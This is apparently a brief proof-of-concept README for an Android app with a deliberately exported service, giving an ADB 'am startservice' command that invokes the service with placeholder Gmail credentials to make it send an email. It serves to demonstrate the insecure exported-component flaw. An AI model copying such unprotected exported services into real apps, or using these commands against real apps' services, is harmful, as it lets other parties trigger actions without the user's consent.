# Exported Service

- Install PoC app on Android device/emulator
- Exploit:
  - ADB command: ```./adb shell am startservice -n "com.poc.exported_service/com.poc.exported_service.SendMailService" --es username "your-gmail" --es password "your-gmail-password" --es gmail "destination-gmail" --es subject "Test.adb.Exported.Service" --es content "success.oh.yeah"```
  - Check mail
